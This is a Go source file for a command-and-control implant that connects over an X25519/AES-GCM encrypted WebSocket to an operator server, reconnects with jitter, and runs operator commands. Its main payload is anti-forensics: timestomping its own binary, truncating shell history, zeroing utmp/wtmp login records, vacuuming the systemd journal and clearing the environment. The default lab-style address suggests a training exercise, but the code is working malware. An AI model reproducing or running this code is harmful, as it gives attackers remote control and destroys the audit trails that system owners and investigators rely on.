package main
import (
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdh"
	"crypto/rand"
	"crypto/sha256"
	_ "embed"
	"encoding/binary"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"strings"
	"sync"
	"time"

	"github.com/coder/websocket"
	"golang.org/x/crypto/hkdf"
)

//go:embed keys/agent.key
var agentPrivKey []byte

//go:embed keys/operator.pub
var operatorPubKey []byte

var serverAddr = envOr("RKLINGS_SERVER_ADDR", "10.0.2.2:8443")

var (
	sharedKey     [32]byte
	agentPubBytes []byte
	writeMu       sync.Mutex
	wsConn        *websocket.Conn
)

// utmpRecordSize is the size of a utmp/utmpx record on Linux amd64.
const utmpRecordSize = 384

// utmpUserOffset is the byte offset of ut_user in the record.
const utmpUserOffset = 44

// utmpUserLen is the maximum length of ut_user (UT_NAMESIZE on Linux amd64).
const utmpUserLen = 32

type Command struct {
	Op   string          `json:"op"`
	Arg  string          `json:"arg,omitempty"`
	Data json.RawMessage `json:"data,omitempty"`
}

var errCiphertextShort = errors.New("ciphertext too short")

func deriveKeys(privRaw, peerPubRaw []byte) (key [32]byte, id [8]byte, err error) {
	curve := ecdh.X25519()
	priv, err := curve.NewPrivateKey(privRaw)
	if err != nil {
		return key, id, err
	}
	pub, err := curve.NewPublicKey(peerPubRaw)
	if err != nil {
		return key, id, err
	}
	secret, err := priv.ECDH(pub)
	if err != nil {
		return key, id, err
	}
	if _, err := io.ReadFull(hkdf.New(sha256.New, secret, nil, []byte("rklings-aead")), key[:]); err != nil {
		return key, id, err
	}
	if _, err := io.ReadFull(hkdf.New(sha256.New, secret, nil, []byte("rklings-id")), id[:]); err != nil {
		return key, id, err
	}
	return
}

func sealAEAD(key [32]byte, plaintext []byte) ([]byte, error) {
	gcm, err := newGCM(key)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}
	return gcm.Seal(nonce, nonce, plaintext, nil), nil
}

func openAEAD(key [32]byte, ciphertext []byte) ([]byte, error) {
	gcm, err := newGCM(key)
	if err != nil {
		return nil, err
	}
	if len(ciphertext) < gcm.NonceSize() {
		return nil, errCiphertextShort
	}
	return gcm.Open(nil, ciphertext[:gcm.NonceSize()], ciphertext[gcm.NonceSize():], nil)
}

func newGCM(key [32]byte) (cipher.AEAD, error) {
	block, err := aes.NewCipher(key[:])
	if err != nil {
		return nil, err
	}
	return cipher.NewGCM(block)
}

func initTransport() {
	curve := ecdh.X25519()
	priv, err := curve.NewPrivateKey(agentPrivKey)
	if err != nil {
		log.Fatalf("parse agent key: %v", err)
	}
	agentPubBytes = priv.PublicKey().Bytes()
	sharedKey, _, err = deriveKeys(agentPrivKey, operatorPubKey)
	if err != nil {
		log.Fatalf("derive keys: %v", err)
	}
}

func wsURL() string {
	scheme := "wss"
	if len(serverAddr) > 0 && (serverAddr[0] >= '0' && serverAddr[0] <= '9' || serverAddr[0] == '[') {
		scheme = "ws"
	}
	return fmt.Sprintf("%s://%s/", scheme, serverAddr)
}

func wsSend(v any) error {
	plain, err := json.Marshal(v)
	if err != nil {
		return err
	}
	ct, err := sealAEAD(sharedKey, plain)
	if err != nil {
		return err
	}
	writeMu.Lock()
	defer writeMu.Unlock()
	return wsConn.Write(context.Background(), websocket.MessageBinary, ct)
}

func wsSession() error {
	ctx := context.Background()
	conn, _, err := websocket.Dial(ctx, wsURL(), nil)
	if err != nil {
		return err
	}
	defer conn.CloseNow()
	conn.SetReadLimit(4 << 20)
	wsConn = conn

	hello, _ := json.Marshal(map[string]string{"t": "hello"})
	ct, err := sealAEAD(sharedKey, hello)
	if err != nil {
		return err
	}
	frame := append(agentPubBytes, ct...)
	if err := conn.Write(ctx, websocket.MessageBinary, frame); err != nil {
		return err
	}

	for {
		_, msg, err := conn.Read(ctx)
		if err != nil {
			return err
		}
		plain, err := openAEAD(sharedKey, msg)
		if err != nil {
			continue
		}
		var cmd Command
		if json.Unmarshal(plain, &cmd) != nil {
			continue
		}
		result := execute(cmd)
		if err := wsSend(map[string]any{"data": result}); err != nil {
			return err
		}
	}
}

func wsLoop() {
	for {
		if err := wsSession(); err != nil {
			log.Printf("ws: %v", err)
		}
		time.Sleep(jitterDuration(5000, 10000))
	}
}

func main() {
	initTransport()
	wsLoop()
}

func execute(cmd Command) any {
	switch cmd.Op {
	case "PING":
		return "PONG"
	case "STATUS":
		return fmt.Sprintf("PID=%d UID=%d ENV=%d", os.Getpid(), os.Getuid(), len(os.Environ()))
	case "CLEANUP":
		if err := cleanup(cmd.Arg); err != nil {
			return fmt.Sprintf("ERR %v", err)
		}
		return "OK"
	case "TIMESTOMP":
		files := strings.SplitN(cmd.Arg, " ", 2)
		if len(files) != 2 {
			return "ERR need target and reference paths"
		}
		if err := timestomp(files[0], files[1]); err != nil {
			return fmt.Sprintf("ERR %v", err)
		}
		return "OK"
	default:
		return fmt.Sprintf("ERR unknown command: %s", cmd.Op)
	}
}

func jitterDuration(minMs, maxMs int) time.Duration {
	var buf [8]byte
	rand.Read(buf[:])
	n := binary.LittleEndian.Uint64(buf[:])
	ms := minMs + int(n%uint64(maxMs-minMs))
	return time.Duration(ms) * time.Millisecond
}

func envOr(name, fallback string) string {
	if value := os.Getenv(name); value != "" {
		return value
	}
	return fallback
}

// timestomp copies the mtime from reference to target, making the target
// blend in with surrounding files.
func timestomp(target, reference string) error {
	info, err := os.Stat(reference)
	if err != nil {
		return fmt.Errorf("stat reference: %w", err)
	}
	mtime := info.ModTime()
	return os.Chtimes(target, mtime, mtime)
}

// clearHistory truncates common shell history files.
func clearHistory(username string) error {
	paths := []string{
		os.Getenv("HOME") + "/.bash_history",
		os.Getenv("HOME") + "/.zsh_history",
		os.Getenv("HOME") + "/.history",
		"/root/.bash_history",
		"/home/" + username + "/.bash_history",
		"/home/" + username + "/.zsh_history",
	}
	for _, p := range paths {
		if _, err := os.Stat(p); err == nil {
			os.Truncate(p, 0)
		}
	}
	return nil
}

// scrubUtmp removes login records for username from utmp and wtmp.
// Each record is utmpRecordSize bytes. Walk the file, zero records
// where ut_user matches username.
func scrubUtmp(username string) error {
	files := []string{"/var/run/utmp", "/var/log/wtmp"}
	record := make([]byte, utmpRecordSize)
	zeros := make([]byte, utmpRecordSize)

	for _, path := range files {
		f, err := os.OpenFile(path, os.O_RDWR, 0)
		if err != nil {
			continue
		}

		for {
			_, err := io.ReadFull(f, record)
			if err != nil {
				break
			}
			user := extractUser(record)
			if user == username {
				// Seek back one record and overwrite with zeros.
				f.Seek(-utmpRecordSize, io.SeekCurrent)
				f.Write(zeros)
			}
		}

		f.Close()
	}
	return nil
}

// tamperJournal vacuums the systemd journal and rotates the active file.
func tamperJournal() error {
	if out, err := exec.Command("/usr/bin/journalctl", "--sync").CombinedOutput(); err != nil {
		return fmt.Errorf("sync journal: %w: %s", err, strings.TrimSpace(string(out)))
	}
	if out, err := exec.Command("/usr/bin/journalctl", "--rotate", "--vacuum-time=1s").CombinedOutput(); err != nil {
		return fmt.Errorf("rotate and vacuum journal: %w: %s", err, strings.TrimSpace(string(out)))
	}
	return nil
}

// cleanup orchestrates all anti-forensics routines.
// username is the login name to scrub from utmp/wtmp.
// If empty, defaults to the current user.
func cleanup(username string) error {
	if username == "" {
		username = os.Getenv("USER")
	}

	if err := timestomp(os.Args[0], "/etc/hostname"); err != nil {
		return err
	}
	if err := clearHistory(username); err != nil {
		return err
	}
	if err := scrubUtmp(username); err != nil {
		return err
	}
	if err := tamperJournal(); err != nil {
		return err
	}
	os.Clearenv()

	return nil
}

// extractUser reads the ut_user field from a utmp record buffer.
func extractUser(record []byte) string {
	if len(record) < utmpUserOffset+utmpUserLen {
		return ""
	}
	raw := record[utmpUserOffset : utmpUserOffset+utmpUserLen]
	end := bytes.IndexByte(raw, 0)
	if end < 0 {
		end = utmpUserLen
	}
	return string(raw[:end])
}
